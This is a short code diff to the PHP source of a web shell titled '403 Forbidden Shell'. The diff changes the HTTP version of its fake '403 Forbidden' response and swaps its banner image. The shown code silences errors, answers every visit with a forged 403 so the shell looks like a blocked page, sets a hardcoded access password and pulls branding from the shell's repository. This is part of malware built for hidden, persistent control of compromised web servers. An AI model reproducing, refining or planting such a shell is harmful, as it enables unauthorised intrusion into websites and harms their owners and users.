@@ -3,7 +3,7 @@
 
 <?php
 error_reporting(0);
-header('HTTP/1.0 403 Forbidden', true, 403);
+header('HTTP/1.1 403 Forbidden', true, 403);
 session_start();
 $pass = "xsxlzxnihboss";
 $link = "";
@@ -78,7 +78,7 @@ echo '<!DOCTYPE HTML>
 <link rel="icon" type="image/gif" href="https://raw.githubusercontent.com/sxlmnwb/403-Forbidden-Shell/master/403_Forbidden_Shell_Icon.png"><br>
 <link href="" rel="stylesheet" type="text/css">
 <title>403 Forbidden Shell</title>
-<center><img src="https://raw.githubusercontent.com/sxlmnwb/403-Forbidden-Shell/master/403_Forbidden_Shell_Banner.png" alt="Forbidden" width="750" height=""> </center>
+<center><img src="https://raw.githubusercontent.com/sxlmnwb/403-Forbidden-Shell/master/403_Forbidden_Shell_Banner_2.png" alt="Forbidden" width="750" height=""> </center>
 <style>
 body{
 font-family: "Tahoma";background-image:url(https://media0.giphy.com/media/VXhUTVzvNmlRm/giphy.gif); background-size:cover; background-attachment: fixed;
